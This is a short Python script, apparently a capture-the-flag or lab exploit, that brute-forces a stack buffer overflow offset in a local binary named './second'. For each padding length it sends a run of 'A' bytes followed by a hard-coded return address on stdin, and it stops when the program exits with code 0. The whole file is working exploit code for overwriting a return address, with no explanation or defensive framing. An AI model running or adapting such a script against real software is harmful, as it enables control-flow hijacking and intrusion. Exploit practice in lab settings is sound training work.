import subprocess

for n in range(255):
    payload = b"A" * n + b"\xb4\x06\x40\x00\n"  # includes NUL; send via stdin
    print(f"[*] Trying n={n}")
    try:
        cp = subprocess.run(
            ["./second"],
            input=payload,  # <-- send payload on stdin
            capture_output=True,
            timeout=2,  # avoid hangs; adjust if needed
        )
    except subprocess.TimeoutExpired:
        print("    (timeout)")
        continue

    print(f"    rc={cp.returncode}")
    if cp.stdout:
        print(f"    stdout: {cp.stdout!r}")
    if cp.stderr:
        print(f"    stderr: {cp.stderr.decode(errors='replace')!r}")

    if cp.returncode == 0:
        print(f"[+] Success at n={n}")
        break
else:
    print("[-] No success in 0..256")
